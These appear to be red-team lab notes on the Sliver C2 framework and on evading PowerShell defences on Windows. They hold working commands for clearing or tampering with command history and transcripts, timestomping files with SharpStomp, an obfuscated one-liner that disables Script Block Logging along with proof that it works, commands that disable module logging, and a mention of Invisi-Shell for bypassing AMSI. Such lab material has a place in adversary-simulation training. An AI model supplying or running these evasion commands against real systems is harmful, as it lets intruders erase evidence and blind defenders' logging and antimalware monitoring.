https://sliver.sh/

1- Sliver is primarily an Open-Source command-line interface (CLI) Command and Control (C2) framework built for Adversary Simulation.
2- Sliver Implants support multiple architectures and Operating Systems.
3- Sliver also supports multiple egress C2 call-back protocols such as DNS, mTLS, WireGuard, and HTTP(S).
4- Sliver has the multiplayer option to allow multiple operators to simultaneously command your C2 server.


## Lab

Use the Get-PSReadlineOption and note the HistorySavePath property value. This file contains the PowerShell command history.
```
(Get-PSReadlineOption).HistorySavePath
```
C:\Users\studentX\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

Bypass PSReadline by removing its functionality using the following command for the current session.
```
Remove-Module PSReadline
```

An alternative would be to modify the ConsoleHost_history.txt file by removing/altering only performed malicious activity from the file and using tools like [SharpStomp](https://github.com/kafkaesqu3/SharpStomp) to timestomp the file back to its original modified date.


## Script Block Logging
Script block logging logs contents of all the script blocks processed by the PowerShell engine regardless of the host used. Longer scripts will be split between multiple **4104** events with the same ScriptBlock ID.
If you enable Invocation Logging, then **4105** will indicate the beginning of a session and **4106** the end of a session. Due to the logging volume Invocation Logging is usually not enabled.

We can use either Windows Event Viewer or PowerShell in this case to see if you can find the Add-Type command in the Microsoft-Windows-PowerShell/Operational log under event ID 4104.
```
Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' -FilterXPath '*[System[(EventID=4104)]]' -MaxEvents 5 | Format-Table TimeCreated,Message -Wrap
```

To Bypass Script Block logging, we can use the following one-liner:
```
[Reflection.Assembly]::"l`o`AdwIThPa`Rti`AlnamE"(('S'+'ystem'+'.C'+'ore'))."g`E`TTYPE"(('Sys'+'tem.Di'+'agno'+'stics.Event'+'i'+'ng.EventProv'+'i'+'der'))."gET`FI`eLd"(('m'+'_'+'enabled'),('NonP'+'ubl'+'ic'+',Instance'))."seTVa`l`Ue"([Ref]."a`sSem`BlY"."gE`T`TyPE"(('Sys'+'tem'+'.Mana'+'ge'+'ment.Aut'+'o'+'mation.Tracing.'+'PSEtwLo'+'g'+'Pro'+'vi'+'der'))."gEtFIe`Ld"(('e'+'tw'+'Provid'+'er'),('N'+'o'+'nPu'+'b'+'lic,Static'))."gE`Tva`lUe"($null),0)
```

Execute the sbloggingbypass.ps1 one-liner and verify that the bypass works after execution as follows:
```
C:\AD\Tools\sbloggingbypass.ps1

Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-PowerShell"; Id=4104} | Measure | % Count
> 6

# Test Command that generates a 4104 event
PS C:\> Get-Module -ListAvailable | Format-Table Name, LogPipelineExecutionDetails

Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-PowerShell"; Id=4104} | Measure | % Count
> 6
```


## Module Logging
This feature was introduced in Windows PowerShell 3.0 that logs pipeline execution and command execution events. It is entirely dictated by the LogPipelineExecutionDetails property of the module.
Module logging appears in two places, we will be focusing on PowerShell 5.0:
```
Get-WinEvent -LogName “windows Powershell”
Get-Module -ListAvailable | Format-Table Name, LogPipelineExecutionDetails
```
While enumerating PowerShell event logs, we notice that modules have a property called LogPipelineExecutionDetails which by default is set to “False”, the ones set to “True” have module logging enabled.

To bypass module logging we can modify the setting of the enabled modules and set it to false. Some commandlets like Get-Command use the Microsoft.Powershell.Core PowerShell snap-in that is still used by modern PowerShell. To disable module logging for the core PowerShell commands, we need to run the following commands.
```
$module = Get-Module Microsoft.PowerShell.Utility
$module.LogPipelineExecutionDetails = $false
$Snapin = Get-PSSnapin Microsoft.PowerShell.Core
$Snapin.LogPipelineExecutionDetails = $false
```
After executing the above command, we couldn’t find any additional 4103 event logs.


## System-Wide Transcription

The Start-Transcript cmdlet Enables transcription (console logging) for everything (powershell.exe, PowerShell ISE, custom hosts - .NET DLL, msbuild, installutil etc.) which uses the PowerShell engine (System.Management.Automation NameSpace/dll).

This policy will automatically record all commands and output them into log files in a directory that you specify. The directory should be created automatically.

An alternative would be to modify the transcript files removing/altering only performed malicious activity from the files and using tools like SharpStomp to timestomp the file back to its original modified date.


## AntiMalware Scan Interface (AMSI) and Defender

Microsoft Defender is an antivirus component of Microsoft Windows. It mainly uses static signatures and heuristic analysis to alert for malicious files on disk.
[Antimalware Scan Interface (AMSI)](https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal) is ideally used to integrate applications and services with antimalware products that provide enhanced malware protection.

AMSI, allows detection of malicious scripts regardless of input method (disk, encodedcommand, in-memory) and the provides registered antivirus access to contents of a script before execution. You will find these alerts in the log Microsoft-Windows-Windows Defender/Operational with event ID 1116 and 1117.
```
Get-WinEvent -LogName 'Microsoft-Windows-Windows Defender/Operational' -FilterXPath "*[System[((EventID=1116) or (EventID=1117))]]" -MaxEvents 5 | Format-Table TimeCreated, Message -Wrap
```


## Automating PowerShell bypasses using Invisi-Shell

Invisi-Shell is a tool to bypass AMSI, ScriptBlock Logging, System Wide Transcript and Module Logging at startup by hooking .NET assemblies. This tool can help perform the same PowerShell Bypasses in an easier and automated fashion.


[19]


